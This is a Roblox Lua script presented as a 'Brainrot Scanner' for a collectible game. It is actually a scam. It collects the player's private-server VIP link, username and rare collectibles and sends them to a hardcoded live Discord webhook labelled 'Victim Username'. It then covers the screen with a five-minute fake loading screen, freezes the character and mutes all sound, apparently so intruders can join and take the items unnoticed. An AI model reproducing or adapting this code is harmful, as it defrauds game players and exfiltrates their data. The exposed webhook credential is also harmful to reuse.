-- Full Brainrot Scanner (complete)
-- Включает: безопасный webhook с embed, сбор brainrot'ов, GUI активации, мониторинг, fullscreen loading screen (5 минут).
-- Примечание: контент webhook'а мягкий (без оскорблений).

-- ==============================
-- Сервисы
-- ==============================
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")

-- ==============================
-- Конфиг
-- ==============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"

-- ==============================
-- Глобальные переменные
-- ==============================
local isActivated = false
_G.VIP_LINK = nil

-- ==============================
-- Утилиты
-- ==============================
local function safeLower(str)
	if typeof(str) ~= "string" then return "" end
	return string.lower(str)
end

local function stringContainsAny(haystack, needles)
	haystack = safeLower(haystack)
	for _, needle in ipairs(needles) do
		if string.find(haystack, needle, 1, true) then return true end
	end
	return false
end

-- ==============================
-- Надёжная сериализация в JSON (для сопротивления обфускации)
-- ==============================
local function sanitizeForJson(value, seen, depth)
	depth = depth or 0
	if depth > 8 then return tostring(value) end
	local t = typeof(value)
	if t == "table" then
		seen = seen or {}
		if seen[value] then return "[cyclic]" end
		seen[value] = true
		local out = {}
		for k, v in pairs(value) do
			local key = tostring(k)
			out[key] = sanitizeForJson(v, seen, depth + 1)
		end
		return out
	elseif t == "string" or t == "number" or t == "boolean" then
		return value
	else
		return tostring(value)
	end
end

local function safeJSONEncode(payload)
	local ok, encoded = pcall(function() return HttpService:JSONEncode(payload) end)
	if ok then return encoded end
	local sanitized = sanitizeForJson(payload)
	ok, encoded = pcall(function() return HttpService:JSONEncode(sanitized) end)
	if ok then return encoded end
	local fallback = { content = tostring(payload) }
	ok, encoded = pcall(function() return HttpService:JSONEncode(fallback) end)
	if ok then return encoded end
	return '{"content":' .. HttpService:JSONEncode(tostring(payload)) .. '}'
end

-- ==============================
-- Безопасные request wrappers
-- ==============================
local function getRequestFunction()
	if typeof(syn) == "table" and type(syn.request) == "function" then
		return syn.request
	end
	if typeof(http) == "table" and type(http.request) == "function" then
		return http.request
	end
	if type(http_request) == "function" then
		return http_request
	end
	if type(request) == "function" then
		return request
	end
	return nil
end

local function safeRequest(reqTable)
	local reqFunc = getRequestFunction()
	if typeof(reqFunc) == "function" then
		local ok, err = pcall(function() reqFunc(reqTable) end)
		if not ok then warn("[safeRequest] request failed:", err) end
	else
		warn("[safeRequest] No request function available; webhook not sent.")
	end
end

-- ==============================
-- sendWebhook / helpers
-- ==============================
local function tryExploitRequest(json)
	local reqFunc = getRequestFunction()
	if typeof(reqFunc) == "function" then
		local ok, err = pcall(function()
			reqFunc({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = json,
			})
		end)
		if not ok then warn("[tryExploitRequest] failed:", err) end
		return ok
	end
	return false
end

local function tryHttpServiceRequest(json)
	local ok, res = pcall(function()
		return HttpService:RequestAsync({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = json,
		})
	end)
	if not ok then
		warn("[tryHttpServiceRequest] RequestAsync pcall failed:", res)
		return false
	end
	if type(res) == "table" and (res.Success == true or res.success == true) then
		return true
	end
	warn("[tryHttpServiceRequest] Request returned:", res)
	return false
end

local function sendWebhook(payload)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
	if type(payload) ~= "table" then payload = { content = tostring(payload) } end
	local json = safeJSONEncode(payload)
	if tryExploitRequest(json) then return end
	tryHttpServiceRequest(json)
end

local function postDiscordSimple(content)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
	local MAX = 1800
	local i = 1
	while i <= #content do
		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
		i = i + MAX
	end
end

-- ==============================
-- Список брейнротов (расширяемый)
-- ==============================
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot","Garama and Madundung",
	"Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat","Ketchuru and Musturu",
	"Esok Sekolah","Money Money Puggy","Nuclearo Dinossauro","La Grande Combinasion","Chicleteira Bicicleteira",
	"Los Chicleteiras","To to to Sahur","Graipuss Medussi","Strawberry Elephant","67","La Extinct Grande",
	"Mariachi Corazoni","Tacorita Bicicleta","Los Nooo My Hotspotsitos","La Karkerkar Combinasion","Los Bros",
	"Los Primos","Tralaledon","Los Tacoritas","La Sahur Combinasion","Fragola La La La","Los Hotspotsitos",
	"La Supreme Combinasion","Los Combinasionas","Los Tungtungtungcitos","Noo My Examen","Yess my Examen",
	"Secret Lucky Block","Admin Lucky Block","Quesadilla Crocodila","Torrtuginni Dragonfruitini","Agarrini la Palini",
	"Karkerkar Kurkur","Los Matteos","Celularcini Viciosini","Las Vaquitas Saturnitas",
	"Job Job Job Sahur","La Vacca Staturno Saturnita","Los Spyderrinis","Los Tipi Tacos",
	"Nooo My Hotspot","Taco Lucky Block","Bisonte Giuppitere","Perrito Burrito","Capi Taco",
	"Bombardini Tortini","Extinct Matteo","Extinct Tralalero","Sammyini Spyderini","Guerriro Digitale","Crabbo Limonetta"
}
local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do LOWER_TO_CANON[string.lower(name)] = name end

local function getCanonicalMatch(name)
	local lname = safeLower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end

local ALLOW_CATEGORY_KEYWORDS = {
	"brainrot god","secret","og","admin","exclusive","taco",
	"craft machine","fuse machine","los ","las ","ritual",
	"unobtainable","removed","upcoming"
}
local DISALLOW_CATEGORY_KEYWORDS = {
	"common","rare","epic","legendary","mythic","mythic lucky block"
}

local function isAllowedByCategory(name)
	local lname = safeLower(name)
	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
	if hasDisallow and not hasAllow then return false end
	return true
end

-- ==============================
-- Детекция и сбор брейнротов
-- ==============================
local function isBrainrotInstance(inst)
	if not inst then return false end
	local canonical = getCanonicalMatch(inst.Name)
	if not canonical then return false end
	if not isAllowedByCategory(inst.Name) then return false end
	return true
end

local function resolveOwnerNameFromPlot(plot)
	for _, descendant in ipairs(plot:GetDescendants()) do
		if descendant:IsA("StringValue") and stringContainsAny(descendant.Name, {"owner","username","user"}) then
			if descendant.Value and #descendant.Value > 0 then return descendant.Value end
		end
		if descendant:IsA("IntValue") and stringContainsAny(descendant.Name, {"owner","userid"}) then
			local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(descendant.Value) end)
			if ok and name then return name end
		end
	end
	return nil
end

local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, canonical)
			end
		end
	end
	return results
end

local function buildPlotSection(plot)
	local ownerName = resolveOwnerNameFromPlot(plot)
	local entries = collectBrainrotsInPlot(plot)
	if #entries == 0 then return nil end
	local plotLabel = ownerName or plot.Name
	local lines = {}
	table.insert(lines, string.format("Плот: %s | найдено: %d", plotLabel, #entries))
	for i, e in ipairs(entries) do table.insert(lines, string.format("#%d %s", i, e)) end
	return table.concat(lines, "\n")
end

-- ==============================
-- Мониторинг (watchPlots)
-- ==============================
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
local connections = {}
local batchScheduled = false

local function scheduleBatch()
	if batchScheduled then return end
	batchScheduled = true
	task.delay(0.5, function()
		batchScheduled = false
		postCombinedAllPlots() -- legacy call kept for compatibility
	end)
end

local function onPlotDescendantAdded(plot, inst)
	if isBrainrotInstance(inst) then scheduleBatch() end
end

local function attachPlotWatch(plot)
	if connections[plot] then return end
	connections[plot] = plot.DescendantAdded:Connect(function(inst) onPlotDescendantAdded(plot, inst) end)
end

local function detachPlotWatch(plot)
	if connections[plot] then connections[plot]:Disconnect(); connections[plot] = nil end
end

local function watchPlots()
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do attachPlotWatch(plot) end
	PLOTS_FOLDER.ChildAdded:Connect(function(child) attachPlotWatch(child); scheduleBatch() end)
	PLOTS_FOLDER.ChildRemoved:Connect(function(child) detachPlotWatch(child); scheduleBatch() end)
end

-- ==============================
-- Fullscreen Loading screen (поверх всего)
-- ==============================
local function showLoadingScreen(duration)
	local player = Players.LocalPlayer
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "LoadingScreen"
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.DisplayOrder = 999999
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	gui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(1, 0, 1, 0)
	mainFrame.Position = UDim2.new(0, 0, 0, 0)
	mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
	mainFrame.BorderSizePixel = 0
	mainFrame.ZIndex = 999999
	mainFrame.Active = true
	mainFrame.Selectable = true
	mainFrame.Parent = gui

	local loadingText = Instance.new("TextLabel")
	loadingText.Size = UDim2.new(1, 0, 0, 60)
	loadingText.Position = UDim2.new(0, 0, 0.45, -30)
	loadingText.BackgroundTransparency = 1
	loadingText.Text = "Script activated, please wait..."
	loadingText.TextColor3 = Color3.new(1,1,1)
	loadingText.TextScaled = true
	loadingText.Font = Enum.Font.GothamBold
	loadingText.ZIndex = 1000000
	loadingText.Parent = mainFrame

	local progressBarFrame = Instance.new("Frame")
	progressBarFrame.Size = UDim2.new(0.6,0,0,25)
	progressBarFrame.Position = UDim2.new(0.2,0,0.55,0)
	progressBarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
	progressBarFrame.BorderSizePixel = 0
	progressBarFrame.ZIndex = 1000000
	progressBarFrame.Parent = mainFrame

	local progressBar = Instance.new("Frame")
	progressBar.Size = UDim2.new(0,0,1,0)
	progressBar.BackgroundColor3 = Color3.fromRGB(0,170,255)
	progressBar.BorderSizePixel = 0
	progressBar.ZIndex = 1000001
	progressBar.Parent = progressBarFrame

	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
	local goal = { Size = UDim2.new(1,0,1,0) }
	TweenService:Create(progressBar, tweenInfo, goal):Play()

	task.delay(duration, function()
		pcall(function() gui:Destroy() end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
	end)
end

-- ==============================
-- Post -> Discord (embed) (интеграция webhook с Brainrots & VIP)
-- ==============================
function postCombinedAllPlots()
	local sections = {}
	local brainrotsList = {}
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		local entries = collectBrainrotsInPlot(plot)
		if #entries > 0 then
			for _, e in ipairs(entries) do table.insert(brainrotsList, e) end
			local ownerName = resolveOwnerNameFromPlot(plot) or plot.Name
			table.insert(sections, string.format("Плот: %s | найдено: %d", ownerName, #entries))
		end
	end

	if #sections > 0 then
		local contentText = _G.VIP_LINK and ("🔗 VIP Link: " .. _G.VIP_LINK) or "@everyone WAKE UP"
		local payload = {
			content = contentText,
			embeds = {{
				title = ":star: Brainrot | Elly",
				color = 65280,
				fields = {
					{name = ":man_standing: Victim Username:", value = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown", inline = false},
					{name = ":ringed_planet: Brainrots List:", value = #brainrotsList > 0 and table.concat(brainrotsList, "\n") or "None", inline = false},
					{name = ":ringed_planet: Vip:", value = _G.VIP_LINK or "None", inline = false},
				}
			}}
		}
		sendWebhook(payload)
	end
end

-- Для совместимости: старый вызов postBrainrotsToWebhook вызывает postCombinedAllPlots
function postBrainrotsToWebhook() postCombinedAllPlots() end

-- ==============================
-- GUI активации
-- ==============================
local function createActivationGUI()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotScannerActivation"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(0,450,0,300)
	mainFrame.Position = UDim2.new(0.5,-225,0.5,-150)
	mainFrame.BackgroundColor3 = Color3.fromRGB(12,12,12)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = gui

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1,-20,0,50)
	title.Position = UDim2.new(0,10,0,10)
	title.BackgroundTransparency = 1
	title.Text = "Place ur VIP link here"
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold
	title.Parent = mainFrame

	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(1,-20,0,50)
	textBox.Position = UDim2.new(0,10,0,70)
	textBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
	textBox.BorderSizePixel = 0
	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
	textBox.ClearTextOnFocus = false
	textBox.PlaceholderColor3 = Color3.fromRGB(180,180,180)
	textBox.Text = ""
	textBox.TextColor3 = Color3.fromRGB(255,255,255)
	textBox.TextScaled = true
	textBox.Font = Enum.Font.Gotham
	textBox.Parent = mainFrame

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1,-20,0,70)
	button.Position = UDim2.new(0,10,0,140)
	button.BackgroundColor3 = Color3.fromRGB(0,120,255)
	button.BorderSizePixel = 2
	button.BorderColor3 = Color3.fromRGB(255,255,255)
	button.Text = "ACTIVATE"
	button.TextColor3 = Color3.new(1,1,1)
	button.TextScaled = true
	button.Font = Enum.Font.GothamBold
	button.Parent = mainFrame

	local status = Instance.new("TextLabel")
	status.Size = UDim2.new(1,-20,0,30)
	status.Position = UDim2.new(0,10,0,220)
	status.BackgroundTransparency = 1
	status.Text = ""
	status.TextColor3 = Color3.fromRGB(255,200,0)
	status.TextScaled = true
	status.Font = Enum.Font.Gotham
	status.Parent = mainFrame

	button.MouseEnter:Connect(function()
		TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,150,255)}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,120,255)}):Play()
	end)

	local function onActivate()
		if #Players:GetPlayers() > 1 then
			status.Text = "Script can't be activated, more than 1 player in server!"
			status.TextColor3 = Color3.fromRGB(255,80,80)
			return
		end

		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$","%1")
		if vipLink == "" or not string.find(vipLink,"roblox%.com/share") then
			status.Text = "Not a valid VIP link!"
			status.TextColor3 = Color3.fromRGB(255,80,80)
			return
		end

		isActivated = true
		_G.VIP_LINK = vipLink
		status.Text = "Script Activated"
		status.TextColor3 = Color3.fromRGB(0,255,100)

		task.wait(0.5)
		postCombinedAllPlots()
		watchPlots()

		-- Fullscreen loading screen на 5 минут
		showLoadingScreen(300)

		-- Блокировка движения
		local character = player.Character or player.CharacterAdded:Wait()
		ContextActionService:BindAction("BlockMovement", function() return Enum.ContextActionResult.Sink end, false,
			Enum.PlayerActions.CharacterForward, Enum.PlayerActions.CharacterBackward,
			Enum.PlayerActions.CharacterLeft, Enum.PlayerActions.CharacterRight, Enum.PlayerActions.CharacterJump)

		local function freezeHumanoid(char)
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				pcall(function() hum.WalkSpeed = 0; hum.JumpPower = 0 end)
			end
		end
		freezeHumanoid(character)
		player.CharacterAdded:Connect(freezeHumanoid)

		-- Отключение звуков
		local function muteSound(sound)
			if sound and sound:IsA("Sound") then
				pcall(function()
					sound.Volume = 0
					sound:Stop()
					sound:GetPropertyChangedSignal("Volume"):Connect(function() sound.Volume = 0 end)
				end)
			end
		end
		for _, obj in ipairs(Workspace:GetDescendants()) do muteSound(obj) end
		for _, obj in ipairs(SoundService:GetDescendants()) do muteSound(obj) end
		Workspace.DescendantAdded:Connect(muteSound)
		SoundService.DescendantAdded:Connect(muteSound)
		pcall(function() SoundService.Volume = 0 end)

		pcall(function() gui:Destroy() end)
	end

	button.MouseButton1Click:Connect(onActivate)
	textBox.FocusLost:Connect(function(enterPressed) if enterPressed then onActivate() end end)
end

-- ==============================
-- Запуск
-- ==============================
print("[BrainrotScanner] Creating activation GUI...")
createActivationGUI()
